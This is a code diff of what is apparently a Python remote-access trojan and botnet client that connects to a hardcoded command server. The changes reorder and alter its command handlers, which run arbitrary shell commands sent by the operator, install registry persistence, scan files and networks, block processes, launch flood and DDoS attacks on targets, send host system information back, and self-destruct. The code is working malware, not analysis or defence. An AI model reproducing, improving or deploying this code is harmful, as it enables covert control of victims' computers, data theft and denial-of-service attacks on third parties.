@@ -1718,11 +1718,7 @@ def kill_zombie():
 
 #endregion
 
-#endregion
-
-#endregion
-
-
+#region Process Control
 def process_control(id=0):
     process_control.stop=0
     while 1: 
@@ -1736,6 +1732,13 @@ def process_control(id=0):
             process_control.stop=0
             break
 
+#endregion
+
+#endregion
+
+#endregion
+
+
 EXCLUDE_DIRECTORY = (
     'Program Files',
     'Program Files (x86)',
@@ -1746,7 +1749,7 @@ EXCLUDE_DIRECTORY = (
 )
 
 
-ip      	= "192.168.0.2" 	# IP_HERE
+ip      	= "192.168.87.28" 	# IP_HERE
 port_    	= "1888"			# PORT_HERE
 
 global blocked_process
@@ -1811,8 +1814,9 @@ class Client():
         global status
         status = None
         def shell(command):
-            stream = os.popen(f'{command}')
-            output = stream.read()
+            output = os.popen(command).read()
+            global status
+            status = "ok"
             return output
         # def shell(command):
         #     output = subprocess.run(command, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
@@ -1820,7 +1824,7 @@ class Client():
         #     status = "ok"
         #     return output.stdout.decode('CP437').strip()
         out = shell(commands)
-        if out == "": out = "Command executed successfully"
+        if out == "": out = "No output"
         self.sock.send(str.encode(out))
         status = None
 
@@ -1935,97 +1939,8 @@ class Client():
     def start(self):
         while True:
             data = self._recv()
-
-            if data == "ping":
-                self.sock.send(str.encode(f"pong"))
-
-            elif data == "stopprocessscontrol":
-                try:
-                    blocked_process = []
-                    process_control.stop = 6969
-                    self.sock.send(f"Process Control Disabled".encode("ascii"))
-                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
-
-            elif data == "systeminfo":
-                try:
-                    data = f""" System Information
-
-                    
-============================================================================================================================
-============================================================================================================================
-
-
-                              Network Info
-            ---------------------------------------------------
-                    Public IP:          {self.public_ip}
-                    Local IP:           {IP_addres}
-        
-
-
-                            Current CPU Info
-    ---------------------------------------------------------------------
-        CPU Frequency:                  {psutil.cpu_freq().current}
-        CPU Utilization:                {psutil.cpu_percent(interval=1)}
-        Per-CPU Utilization:            {psutil.cpu_percent(interval=1, percpu=True)}
-        Min CPU Frequency:              {psutil.cpu_freq().min}
-        Max CPU Frequency:              {psutil.cpu_freq().max}
-
-        Number of physical cores: {psutil.cpu_count(logical=False)}
-        Number of logical cores:  {psutil.cpu_count(logical=True)}
-
-
-
-                                RAM Info
-    ---------------------------------------------------------------------
-        Available RAM:                  {round(psutil.virtual_memory().available/1000000000, 2)} GB
-        Used RAM:                       {round(psutil.virtual_memory().used/1000000000, 2)} GB
-        RAM Usage:                      {psutil.virtual_memory().percent}%
-
-
-
-                                OS Info
-    ---------------------------------------------------------------------
-        Machine Type:                   {platform.machine()}
-        Processor Type:                 {platform.processor()}
-        Platform Type:                  {platform.platform()}
-        OS Type:                        {platform.system()}
-        OS Release Version:             {platform.release()}
-                    
-
-============================================================================================================================
-============================================================================================================================
-"""
-                    self.sock.send(str.encode(data))
-                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
-
-            elif data == "sendinfo":
-                try:
-                    self.sock.send(str.encode(f"{self.public_ip} {socket.gethostname()} {platform.system()} Online"))
-                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
-
-            elif data == "selfdestruct":
-                try:
-                    self.sock.send(str.encode(f"{self.public_ip}    Self destructing..."))
-                    self._self_destruct()
-                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
-
-            elif data == "networkscan":
-                try: self.sock.send(f"{network_scan()}".encode("ascii"))
-                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
-
-            elif data == "jigglecursor":
-                try:
-                    threading.Thread(target=cursor_jiggle, args=(420,)).start()
-                    self.sock.send(str.encode("Jiggling Cursor Enabled"))
-                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
-
-            elif data == "jigglecursorstop":
-                try:
-                    cursor_jiggle.stop = 420
-                    self.sock.send(str.encode("Jiggling Cursor Disabled"))
-                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
-
-            elif "attack" in data:
+            
+            if "attack" in data:
                 try:
                     data=data.replace("attack ","").split()
                     method = str(data[0]).lower()
@@ -2043,6 +1958,29 @@ class Client():
                         threading.Thread(target=runflooder, args=(target, por_t, t, thread)).start()
 
                 except: pass
+
+            elif "persistance" in data:
+                try:
+                    data=data.replace("persistance ","").split()
+                    registry_name = data[0]
+                    if self.persistance(registry_name): self.sock.send(str.encode("Persistance Successful!"))
+                    else: self.sock.send(str.encode("Persistance Failed!"))
+                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
+
+            elif "scanfiles" in data:
+                try:
+                    data = data.replace("scanfiles ","").split()
+                    self.scan_files(data)
+                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
+
+            elif "processcontrol" in data:
+                try:
+                    global blocked_process
+                    data = data.replace("processcontrol ","").split()
+                    blocked_process += data
+                    threading.Thread(target=process_control, args=(6969,)).start()
+                    self.sock.send(f"Process Control Enabled".encode("ascii"))
+                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
 
             elif "ddos" in data:
                 try:
@@ -2072,54 +2010,19 @@ class Client():
 
                 except: pass
 
-            elif "persistance" in data:
-                try:
-                    data=data.replace("persistance ","").split()
-                    registry_name = data[0]
-                    if self.persistance(registry_name): self.sock.send(str.encode("Persistance Successful!"))
-                    else: self.sock.send(str.encode("Persistance Failed!"))
-                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
-
-            elif "scanfiles" in data:
-                try:
-                    data = data.replace("scanfiles ","").split()
-                    self.scan_files(data)
-                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
-
-            elif "processcontrol" in data:
-                try:
-                    data = data.replace("processcontrol ","").split()
-                    blocked_process += data
-                    threading.Thread(target=process_control, args=(6969,)).start()
-                    self.sock.send(f"Process Control Enabled".encode("ascii"))
-                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
-
             elif "root" in data:
-                try: commands = data.replace("root ","") ; self._shell_run(commands)
+                try:
+                    commands = data.replace("root ","")
+                    self._shell_run(commands)
                 except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
 
             elif "portscan" in data:
                 try:
-                    data = data.replace("portscan ","").split()
-                    starting_port = int(data[0])
-                    ending_port = int(data[1])
-                    thread_amount = int(data[2])
-
-                    def custom_scan():
-                        arp_request = ARP(pdst="192.168.0.1/24")
-                        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
-                        arp_request_broadcast = broadcast/arp_request
-                        answerred, _ = srp(arp_request_broadcast, timeout=1, verbose=0)
-                        
-                        clients = []
-                        for element in answerred:
-                            clients.append({
-                                "ip": element[1].psrc,
-                        })
-                        return clients
-
-                    ips_to_scan = custom_scan()
-                    ports_ = ""
+                    data = data.replace("pscan ","").split()
+                    ipp = data[0]
+                    starting_port = int(data[1])
+                    ending_port = int(data[2])
+                    thread_amount = int(data[3])
 
                     def _portscanner(ipp, starting_port, ending_port, thread_amount):
                         target = ipp
@@ -2161,10 +2064,7 @@ class Client():
 
                         return run_scanner(thread_amount, starting_port, ending_port)
                     
-                    for ip in ips_to_scan:
-                        ports_ += f'\n{ip["ip"]} \t {_portscanner(ip["ip"], starting_port, ending_port, thread_amount)}\n\n'
-                    
-                    self.sock.send(f" {ports_}".encode("ascii"))
+                    self.sock.send(str.encode(f"{ipp}  Open ports are: {_portscanner(ipp, starting_port, ending_port, thread_amount)}"))
                 except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
 
             elif "admincheck" in data:
@@ -2229,6 +2129,81 @@ class Client():
                     self.sock.send(str.encode("Stressing target for " + str(time) + " seconds" + " with " + str(tasks) + " tasks"))
                 except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
 
+            elif data == "stopprocessscontrol":
+                try:
+                    blocked_process = []
+                    process_control.stop = 6969
+                    self.sock.send(f"Process Control Disabled".encode("ascii"))
+                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
+
+            elif data == "systeminfo":
+                try:
+                    data = f""" System Information
+                    
+============================================================================================================================
+============================================================================================================================
+                              Network Info
+            ---------------------------------------------------
+                    Public IP:          {self.public_ip}
+                    Local IP:           {IP_addres}
+        
+                            Current CPU Info
+    ---------------------------------------------------------------------
+        CPU Frequency:                  {psutil.cpu_freq().current}
+        CPU Utilization:                {psutil.cpu_percent(interval=1)}
+        Per-CPU Utilization:            {psutil.cpu_percent(interval=1, percpu=True)}
+        Min CPU Frequency:              {psutil.cpu_freq().min}
+        Max CPU Frequency:              {psutil.cpu_freq().max}
+        Number of physical cores: {psutil.cpu_count(logical=False)}
+        Number of logical cores:  {psutil.cpu_count(logical=True)}
+                                RAM Info
+    ---------------------------------------------------------------------
+        Available RAM:                  {round(psutil.virtual_memory().available/1000000000, 2)} GB
+        Used RAM:                       {round(psutil.virtual_memory().used/1000000000, 2)} GB
+        RAM Usage:                      {psutil.virtual_memory().percent}%
+                                OS Info
+    ---------------------------------------------------------------------
+        Machine Type:                   {platform.machine()}
+        Processor Type:                 {platform.processor()}
+        Platform Type:                  {platform.platform()}
+        OS Type:                        {platform.system()}
+        OS Release Version:             {platform.release()}
+                    
+============================================================================================================================
+============================================================================================================================
+"""
+                    self.sock.send(str.encode(data))
+                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
+
+            elif data == "sendinfo":
+                try:
+                    self.sock.send(str.encode(f"{self.public_ip} {socket.gethostname()} {platform.system()} Online"))
+                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
+
+            elif data == "selfdestruct":
+                try:
+                    self.sock.send(str.encode(f"{self.public_ip}    Self destructing..."))
+                    self._self_destruct()
+                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
+
+            elif data == "networkscan":
+                try: self.sock.send(f"{self.public_ip}    {network_scan()}".encode("ascii"))
+                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
+
+            elif data == "jigglecursor":
+                try:
+                    threading.Thread(target=cursor_jiggle, args=(420,)).start()
+                    self.sock.send(str.encode("Jiggling Cursor Enabled"))
+                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
+
+            elif data == "jigglecursorstop":
+                try:
+                    cursor_jiggle.stop = 420
+                    self.sock.send(str.encode("Jiggling Cursor Disabled"))
+                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
+
+            elif data == "ping":
+                self.sock.send(str.encode(f"pong"))
 
             else: self.sock.send(str.encode("Invalid Command"))
 
